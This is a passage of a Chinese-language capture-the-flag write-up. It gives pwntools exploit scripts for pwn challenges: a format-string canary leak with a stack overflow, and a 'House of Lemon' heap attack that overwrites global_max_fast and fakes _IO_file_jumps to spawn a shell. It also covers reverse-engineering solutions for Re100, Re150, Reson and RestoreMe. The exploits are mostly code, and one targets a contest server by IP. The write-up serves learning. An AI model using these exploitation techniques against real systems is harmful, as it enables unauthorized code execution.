io.clean() 
io.sendline('1') 
io.recvuntil('Name:') 
io.send(name) 
def get_file(filename): 
io.recvuntil('-->') 
io.clean() 
io.sendline('2') 
io.recvuntil('input the filename:') 
io.send(filename) 
def leave_message(message): 
io.recvuntil('-->') 
io.clean() 
io.sendline('3') 
io.recvuntil('Input your msg:') 
io.send(message) 
leave_message('%26$016lx%30$016lx') 
io.recvuntil('Ok,I get your msg:') 
canary = int(io.recvn(16), 16) 
leak_elf_addr = int(io.recvn(16), 16) 
base_elf_addr = leak_elf_addr - (0x555555555612 - 0x555555554000) 
log.info('canary:%#x' % canary) 
log.info('leak_elf_addr:%#x' % leak_elf_addr) 
log.info('base_elf_addr:%#x' % base_elf_addr) 
open_flag = base_elf_addr + 0xf09 
payload = 'A' * 0x28 + p64(canary) + 'A' * 0x18 + p64(open_flag) + '\n' 
login(payload) 
io.recv() 
House of Lemon 
在 submit 时没有初始化局部变量，可以泄露出 libc 地址，在 remove cart 时可以
向任意地址写一个 bss 段上的地址，这里覆盖 global_max_fast 的值，之后所有
的 bin 都会当成 fastbin 来处理，而计算 fastbin_index 后就可能会在之后访问
fastbinsY 时造成越界，这样在 delete advise 时，通过 add 时精心构造的 malloc
的 size 就可以把 advise 的地址 free 到_IO_2_1_stdout_中的_IO_file_jumps，这样
advise 就是一个伪造的_IO_file_jumps，因此 edit advise 时伪造_IO_file_xsputn
函数指针为 one gadget 的地址，之后再 delete advise 就可以 getshell 
EXP： 
from pwn import * 
VERBOSE = 1 
DEBUG = 0 
LOCAL = 1 
if VERBOSE: 
context.log_level = 'debug' 
if LOCAL: 
io = process('./pwn500', env={'LD_PRELOAD': './libc.so'}) 
if DEBUG: 
gdb.attach(io) 
else: 
io = remote('119.29.87.226', 50005) 
def submit(phone, address): 
io.recvuntil('Pls input your choice:\n') 
io.sendline('4') 
io.recvuntil('Pls input your phone number first:\n') 
io.send(phone) 
io.recvuntil('Ok,Pls input your home address\n') 
io.send(address) 
def lemon_add(type): 
io.recvuntil('Pls input your choice:\n') 
io.sendline(str(type)) 
io.recvuntil('Pls Input your choice:\n') 
io.sendline('2') 
def lemon_remove(type): 
io.recvuntil('Pls Input your choice:\n') 
io.sendline('3') 
def lemon_leave(type, msg): 
io.recvuntil('Pls Input your choice:\n') 
io.sendline('4') 
io.recvuntil('Get Input:\n') 
io.send(msg) 
def lemon_back(type): 
io.recvuntil('Pls Input your choice:\n') 
io.sendline('5') 
def leave_advise(size): 
io.recvuntil('Pls input your choice:\n') 
io.sendline('3') 
io.recvuntil('4.return\n') 
io.sendline('1') 
io.recvuntil('Input size(200~8000):\n') 
io.sendline(str(size)) 
def edit_advise(content): 
io.recvuntil('Pls input your choice:\n') 
io.sendline('3') 
io.recvuntil('4.return\n') 
io.sendline('2') 
io.recvuntil('Input your advise\n') 
io.send(content) 
def del_advise(): 
io.recvuntil('4.return\n') 
io.sendline('3') 
def return_advise(): 
io.recvuntil('4.return\n') 
io.sendline('4') 
submit('A' * 0xf, 'A' * 36 + 'bird' + '\n') 
io.recvuntil('bird') 
leak_libc = u64(io.recvn(6) + '\x00\x00') 
base_libc = leak_libc - 0x34530 
log.info('leak_libc:%#x' % leak_libc) 
log.info('base_libc:%#x' % base_libc) 
leave_advise(6064) 
return_advise() 
max_fast_addr = base_libc + 0x39D868 
lemon_add(1) 
lemon_leave(1, 'A' * 0x18 + p64(max_fast_addr - 0x10)) 
lemon_remove(1) 
lemon_back(1) 
one_gadget = base_libc + 0x3F5A0 
edit_advise('A' * 0x28 + p64(one_gadget) + '\n') 
del_advise() 
io.interactive() 
Re 
Re100 
就解密吧… 
t = [157, 151, 141, 181, 132, 187, 251, 186, 145, 140, 144, 189, 253, 145, 128, 254, 
188, 145, 141, 254, 170, 171, 179] 
s = '' 
for v in t: 
    for i in xrange(0x100): 
        if (~(~(i | 0xCE) | ~(~i | 0x31)))&0xff == v: 
            s += chr(i) 
print s 
Re150 
用 idapython 还原代码 
def xor(n): 
n ^= 0x42 
return (n>3)&0xff 
for i in xrange(0x432): 
addr = 0x08048320+i 
PatchByte(addr,xor(Byte(addr))) 
去掉花指令，就能 f5 了，根据逻辑解密就行 
t = [115, 141, 242, 76, 199, 212, 123, 247, 24, 50, 113, 13, 207, 220, 103, 79, 127, 11, 
109] 
s = '' 
for i,v in enumerate(t): 
v ^= i^0x20 
s += chr(((v >> (8 - i % 8)) | (v << i % 8))&0xff) 
print s 
Reson 
这题的逻辑是根据我们的输入生成一个大数，然后求模验证，验证通过就可以
由这个大数生成 flag 
用剩余定理求出大数 0x4bc82d867feb90，用工具算出 flag 生成过程中求幂运算
的结果 0x69ADD5A34537F9C5，修改寄存器就得到 flag 了 
RestoreMe 
先是 pyc 的还原，分析加密程序，发现里面没什么特别的加密，像 opcode 的替
换等，所以生成个跟题目 pyc 文件大小差不多的 pyc 给加密程序加密，然后比
较分析，将 Game.pyc 还原出来 
反编译后看 py 源码，发现是个游戏，然后就写脚本爆破了，但是 Game.exe 还
有别的信息 
我们的输入会对程序里的一个字符串 FCSRKMOFY 进行修改，该串的 md5 为
77be496aa517273f850f78f7425c76bb，由于修改过程中是用串里的字符进行替
换，所以用 hashcat 跑出替换后的结果 FROMOFSYC，根据 py 和 exe 的综合分
析，我们的输入长度为 48 
，并且前 40 个字符不仅满足 py 的条件，还满足将字符串替换成 FROMOFSCY
的条件，后面的 8 个字符是 08091819，剩下的爆破即可